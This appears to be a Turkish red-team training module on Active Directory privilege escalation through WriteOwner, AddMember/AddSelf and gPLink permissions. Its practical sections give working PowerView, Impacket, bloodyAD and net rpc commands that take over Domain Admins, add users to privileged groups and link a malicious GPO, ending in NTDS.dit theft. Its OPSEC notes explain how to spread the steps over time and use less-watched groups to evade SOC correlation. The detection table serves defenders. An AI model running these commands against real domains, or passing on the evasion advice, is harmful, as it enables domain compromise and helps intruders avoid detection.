## 1. Kavramsal Temel — Neden Var?

[05.1](./05.1_DACL_Abuse.md) doğrudan hakları (GenericAll) işledi. Bu bölüm **dolaylı** ama eşdeğer güçte üç kenarı ele alır:

> **WriteOwner** = "sahipliği al" (sahip DACL'i değiştirebilir → GenericAll'a giden dolaylı yol). **AddMember/AddSelf** = "bir gruba üye ekle" (grup neye yetkiliyse ona miras konarsın). **WriteProperty(gPLink)** = "bir OU'ya GPO bağla" (o OU'daki tüm makinelere kod). Üçü de tek bir masum-görünümlü ACE'den başlar ama Domain Admin'e kadar zincirlenir.

Bunlar "yükseltme"nin sessiz varyantlarıdır: parola sıfırlamak gibi bir servisi bozmazlar; **yapısal** değişiklik yaparlar (sahiplik, üyelik, politika bağı).

**Analoji:** WriteOwner = bir binanın tapusunu üstüne geçirmek (sonra kilitleri değiştirirsin). AddMember = yetkili bir ekibe kendini yazdırmak. GPLink = bir kata uygulanan kural setini o kata bağlayabilmek — kuralı yazan katı yönetir.

## 2. Teknik Derinlik

### 2.1 WriteOwner zinciri — sahiplik neden güçlü?

```
   Windows güvenlik modeli: bir nesnenin SAHİBİ (owner), o nesnenin DACL'ini
   HER ZAMAN değiştirebilir (WRITE_DAC hakkı sahibe örtük verilir).

   WriteOwner ──▶ sahipliği kendine al ──▶ (artık sahip) DACL'e GenericAll yaz ──▶ tam kontrol
        │                                        │
   Set-DomainObjectOwner                Add-DomainObjectAcl
```

### 2.2 AddMember / AddSelf ve grup-içi grup

`WriteProperty` (member özniteliği) veya `Self`/`AddSelf` (grup için) hakkı, bir gruba üye eklemene izin verir. AGDLP ([Sistem 03.3](../../1-Sistem_Yoneticisi/Modul_03_Nesne_ve_Kimlik_Yonetimi/03.3_Grup_Ustaligi_AGDLP.md)) nedeniyle gruplar iç içedir → **düşük bir gruba** eklenmek, iç içe geçmeler yoluyla yüksek yetkiye taşıyabilir:

```
   [jdoe] ─AddMember→ [App-Admins] ─MemberOf→ [Server-Admins] ─MemberOf→ [Tier1-Admins]
   Tek "App-Admins'e ekle" hakkı, üç kademe yukarı miras taşır.
```

### 2.3.1 RBCD köprüsü — makine üzerinde GenericWrite

Bir **bilgisayar** hesabı üzerinde `GenericWrite`/`GenericAll` varsa, sahiplik/üyelik yerine **RBCD** (Resource-Based Constrained Delegation, [Modül 06.3](../Modul_06_Kerberos_Delegation_Saldirilari/)) kurabilirsin: `msDS-AllowedToActOnBehalfOfOtherIdentity`'ye kontrol ettiğin bir hesabı yaz → o makinede herhangi biri (admin dahil) gibi bilet al. Yani "makineye yazma" = "makineyi ele geçirme" → [06.3](../Modul_06_Kerberos_Delegation_Saldirilari/) ile birleşir.

### 2.4 GPLink abuse — OU'ya kötücül GPO bağlama

`WriteProperty(gPLink)` bir OU üzerinde varsa, **var olan (veya senin kontrol ettiğin) bir GPO'yu** o OU'ya bağlarsın. GPO içeriği o OU'daki tüm bilgisayar/kullanıcılara uygulanır → [05.3](./05.3_GPO_Abuse_SharpGPOAbuse.md) ile birleşir. GPO'yu doğrudan düzenleyemesen bile, **kötücül bir GPO'yu bağlama** yetkin varsa yeterlidir.

## 3. Pratik Uygulama — Çok Araçlı

### 3.1 WriteOwner → sahiplik → DACL → kontrol

```powershell
# PowerView (Windows) — üç adım
Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity jdoe          # 1) sahip ol
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity jdoe -Rights All  # 2) GenericAll
Add-DomainGroupMember -Identity "Domain Admins" -Members jdoe                 # 3) kendini ekle
```

```bash
# Linux — bloodyAD / Impacket owneredit + dacledit
owneredit.py -action write -new-owner jdoe -target "Domain Admins" corp.local/jdoe:'Welcome1' -dc-ip 10.10.10.5
dacledit.py -action write -rights FullControl -principal jdoe -target "Domain Admins" corp.local/jdoe:'Welcome1'
bloodyAD -u jdoe -p 'Welcome1' -d corp.local --host dc01 set owner "Domain Admins" jdoe
```

### 3.2 AddMember → gruba kendini ekle

```powershell
Add-DomainGroupMember -Identity "Server-Admins" -Members jdoe
Get-DomainGroupMember -Identity "Server-Admins"   # doğrula
```

```bash
net rpc group addmem "Server-Admins" "jdoe" -U "corp.local/jdoe%Welcome1" -S dc01
bloodyAD -u jdoe -p 'Welcome1' -d corp.local --host dc01 add groupMember "Server-Admins" jdoe
```

### 3.2.1 Token yenileme — üyelik ne zaman etkili olur?

```
   Gruba eklendikten SONRA yeni yetki hemen aktif DEĞİL: mevcut token eski üyeliği taşır.
   → Yeni token gerekir:
     - Etkileşimli: çıkış/giriş (logoff/logon)
     - Kerberos: yeni TGT al (klist purge; sonra kimlik doğrula) → PAC'a yeni grup girer
   Uzaktan çalışıyorsan: yeni bir kimlik doğrulama oturumu aç (nxc/impacket yeniden bağlan).
```

### 3.3 GPLink → OU'ya kötücül GPO bağla

```powershell
# Kontrol ettiğim bir GPO'yu hedef OU'ya bağla (New-GPLink / SharpGPOAbuse ile içerik → 05.3)
New-GPLink -Name "EvilGPO" -Target "OU=Workstations,DC=corp,DC=local"
# veya PowerView ile gPLink özniteliğini doğrudan yaz
Set-DomainObject -Identity "OU=Workstations,DC=corp,DC=local" -Set @{gPLink='[LDAP://cn={GUID},...;0]'}
```

**Örnek doğrulama:**
```
[+] jdoe is now owner of CN=Domain Admins
[+] jdoe added to Domain Admins    ← klist/whoami ile yeni token'ı al (yeniden giriş)
```

### 3.4 bloodyAD ile tek-araç zinciri (Linux)

```bash
# bloodyAD, WriteOwner→DACL→member zincirini tek arayüzde sunar
bloodyAD -u jdoe -p 'Welcome1' -d corp.local --host dc01 set owner "Server-Admins" jdoe
bloodyAD -u jdoe -p 'Welcome1' -d corp.local --host dc01 add genericAll "Server-Admins" jdoe
bloodyAD -u jdoe -p 'Welcome1' -d corp.local --host dc01 add groupMember "Server-Admins" jdoe
# gPLink bağlama da destekler:
bloodyAD ... add gplink "OU=Workstations,DC=corp,DC=local" "{GPO-GUID}"
```

## 4. Bıraktığı İz ve Karşı Tespit

| Teknik | MITRE ATT&CK | Bıraktığı iz (IOC) | Karşı Blue tespiti |
|--------|--------------|--------------------|--------------------|
| WriteOwner → sahiplik | **T1222.001** | **5136** owner (nTSecurityDescriptor) değişti | [Blue 05.2](../../2-Blue_Team/Modul_05_Yetki_ve_ACL_Sikilastirma/05.2_Tehlikeli_DACL_Denetimi_ve_Temizligi.md) |
| Gruba üye ekleme | **T1098** / T1078 | **4728/4732** (güvenlik grubuna üye eklendi) — özellikle Domain Admins | [Blue 05.4](../../2-Blue_Team/Modul_05_Yetki_ve_ACL_Sikilastirma/05.4_AdminSDHolder_ve_SDProp_Izleme.md) |
| GPLink değişikliği | **T1484.001** (GPO Modification) | 5136 OU gPLink değişti; SYSVOL GPO erişimi | [Blue 05.3](../../2-Blue_Team/Modul_05_Yetki_ve_ACL_Sikilastirma/05.3_GPO_Guvenligi_ve_Yetki_Devri_Hijyeni.md) |

**OPSEC notları:**
- **4728/4732 (grup üyeliği değişti)** özellikle korunan gruplar (Domain/Enterprise Admins) için hemen hemen her SOC'ta yüksek-öncelikli alarmdır. Domain Admins'e doğrudan eklenmek **en gürültülü** yoldur — mümkünse ara bir gruba (daha az izlenen) eklen, oradan zincirle.
- **SDProp geri alması:** Korunan gruplara eklediğin üyelik kalıcıdır ama gruba yazdığın **ACL** SDProp (60 dk) ile geri alınır. Üyelik ekleme (4728) ile ACL ekleme (5136) farklı loglar üretir; hangisini kullandığını bil.
- **WriteOwner iz zinciri:** sahiplik değişimi (5136 owner) → sonra DACL yazımı (5136 DACL) → sonra üyelik (4732). Üç ardışık olay bir "abuse zinciri" imzasıdır; savunmacı korelasyon kurar. Adımları zamana yay veya en az izlenen tek adımı seç.
- **Geri temizlik:** Sahiplik/üyelik/gPLink değişikliklerini engagement sonunda geri al — hem tespit riskini hem "temizlik borcunu" azaltır.

### Gerçek-dünya WriteOwner zinciri

```
   1) 01.3: jdoe → "Backup Operators" grubu üzerinde WriteOwner
   2) owneredit.py: grubun sahipliğini jdoe'ya al
   3) dacledit.py: sahip olarak kendine GenericAll ver
   4) net rpc group addmem "Backup Operators" jdoe: kendini ekle
   5) yeni token için yeniden giriş (klist) → SeBackupPrivilege → DC'de NTDS.dit → Modül 09
   Üç ACE değişimi (owner→DACL→member) ardışık; zamana yayarak korelasyonu kır.
```

### Ek: AddSelf ve "kendini ekleme" nüansı

```
   AddSelf (WRITE_PROPERTY, member, SELF SID'e) : SADECE kendini ekleyebilirsin (başkasını değil)
   WriteProperty (member, herhangi)             : istediğini ekle
   → BloodHound "AddSelf" kenarı = sadece kendini o gruba yaz. Çoğu self-service
     dağıtım grubu hatası bu şekildedir ve yüksek gruba zincirlenebilir.
```
